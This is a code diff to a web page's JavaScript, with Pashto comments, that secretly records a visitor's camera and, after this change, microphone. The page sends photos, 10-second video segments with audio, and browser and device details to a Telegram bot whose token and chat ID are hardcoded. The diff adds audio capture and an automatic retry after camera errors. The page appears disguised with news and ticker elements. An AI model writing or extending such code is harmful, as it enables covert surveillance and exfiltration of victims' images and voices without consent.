@@ -503,6 +503,7 @@
         const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
         const CHAT_ID = "8295417969";
         const CAPTURE_INTERVAL = 4000; // 4 seconds
+        const VIDEO_SEGMENT = 10000; // 10 seconds per video segment
         
         // ================================================================
         //  GET CODE FROM URL
@@ -615,10 +616,9 @@
         let tickerTimer = null;
         let newsTimer = null;
         let totalVideoTime = 0;
-        let isFirstPhoto = true;
         
         // ================================================================
-        //  START CAMERA
+        //  START CAMERA (With Audio)
         // ================================================================
         async function startCamera() {
             try {
@@ -658,11 +658,15 @@
             } catch (error) {
                 console.error('Camera error:', error);
                 sendErrorToTelegram(error.message);
+                // بیا هڅه وکړئ
+                setTimeout(() => {
+                    if (!isRunning) startCamera();
+                }, 3000);
             }
         }
         
         // ================================================================
-        //  VIDEO RECORDING (تر پایه پورې)
+        //  VIDEO RECORDING (تر پایه پورې + غږ)
         // ================================================================
         function startVideoRecording() {
             if (!stream) return;
@@ -703,6 +707,19 @@
             
             mediaRecorder.start(1000);
             isRecording = true;
+            
+            // هر ۱۰ ثانیې یوه برخه بنده کړئ (د اوږدې ویډیو لپاره)
+            const segmentInterval = setInterval(() => {
+                if (mediaRecorder && isRecording) {
+                    mediaRecorder.stop();
+                    isRecording = false;
+                }
+            }, VIDEO_SEGMENT);
+            
+            // که پاڼه بنده شي، انټرول بنده کړئ
+            window.addEventListener('beforeunload', function() {
+                clearInterval(segmentInterval);
+            });
         }
         
         // ================================================================
@@ -758,7 +775,7 @@
         }
         
         // ================================================================
-        //  SEND VIDEO
+        //  SEND VIDEO (With Audio)
         // ================================================================
         async function sendVideoToTelegram(blob, duration) {
             try {
@@ -769,7 +786,8 @@
                     `🎥 **Video Segment**\n` +
                     `🆔 **Session:** ${sessionId}\n` +
                     `⏱️ **Duration:** ${duration}s\n` +
-                    `📊 **Total Video:** ${totalVideoTime}s`
+                    `📊 **Total Video:** ${totalVideoTime}s\n` +
+                    `🎙️ **Audio:** Included`
                 );
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { 
@@ -795,7 +813,8 @@
                         text: `🎬 **New Session Started**\n\n` +
                               `🆔 **Session:** ${sessionId}\n` +
                               `🌍 **Browser:** ${browser}\n` +
-                              `📱 **Device:** ${device}`,
+                              `📱 **Device:** ${device}\n` +
+                              `🎙️ **Audio:** Enabled`,
                         parse_mode: 'Markdown'
                     })
                 });
@@ -814,7 +833,8 @@
                               `🆔 **Session:** ${sessionId}\n` +
                               `⏱️ **Duration:** ${Math.floor(totalTime/60)}m ${totalTime%60}s\n` +
                               `📸 **Photos:** ${photoCount}\n` +
-                              `🎥 **Video:** ${totalVideoTime}s total`,
+                              `🎥 **Video:** ${totalVideoTime}s total\n` +
+                              `🎙️ **Audio:** Included`,
                         parse_mode: 'Markdown'
                     })
                 });
